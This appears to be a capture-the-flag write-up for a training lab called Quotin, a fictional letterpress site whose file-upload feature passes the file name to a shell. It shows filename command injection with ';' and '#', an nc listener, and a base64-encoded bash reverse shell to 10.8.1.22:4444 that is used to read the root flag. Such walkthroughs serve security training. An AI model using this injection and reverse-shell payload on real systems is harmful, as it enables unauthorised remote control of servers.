# Quotin

### Lab Link
[WebVerse - Quotin](https://dashboard.webverselabs-pro.com/foundational-labs/quotin)

> Quotin is a two-person letterpress studio in rural Vermont. Iris sets the type. Tobias runs the 1958 Heidelberg Windmill. They take three commissions a month, wedding suites, save-the-dates, monogrammed envelopes, hand-numbered. As a small handmade gift, the homepage offers any visitor a free preview proof: upload your monogram, get back a watermarked preview pressed into Crane's heaviest cotton stock. The feature was built by Iris on a quiet Sunday and works exactly the way she expected, except for one shell call she didn't think too hard about.

---
### Skills & Knowledge

- RCE *(Remote Code Execution)*
- RevShell

---

> First we create blank image in jpeg format

```
convert -size 200x200 xc:white test.jpg
```

#### Trying the Upload File, to test the input if it is vulnerable in an `RCE`. Since we can open our proofs, upon checking the `Request` it can be identify that it uses a `php` maybe we can upload a web shell. We know the application is using PHP, so we use PHP shell.


![alt text](/Writeups/images/Quotinimage.png)

![alt text](/Writeups/images/Quotinimage-1.png)

---
#### Now we try to manipulate the `filename` in the `Request` to test if it is vulnerable to `RCE`.

![alt text](/Writeups/images/Quotinimage-2.png)

```
;#
```
#### We can see in the Response that the command has been placed.

![alt text](/Writeups/images/Quotinimage-3.png)

---

With this we can proceed to create the Reverse Shell

> Start the listener from our machine port

```
nc -lnvp 4444
```
![alt text](/Writeups/images/Quotinimage-4.png)

Using the tool [RevShells](https://www.revshells.com/) to create the payload

![alt text](/Writeups/images/Quotinimage-5.png)

![alt text](/Writeups/images/Quotinimage-6.png)

```
; -> terminates the original command
<command> -> our payload
# -> comments out the rest
```
#### Besides the `test.jpg` we insert the command.

```
echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjguMS4yMi80NDQ0IDA+JjE= | base64 -d | bash #
```

![alt text](/Writeups/images/Quotinimage-7.png)

---

Going back to the terminal we are now successful to the revshell

![alt text](/Writeups/images/Quotinimage-8.png)

> Now we can do a listing to root and view the flag

![alt text](/Writeups/images/Quotinimage-9.png)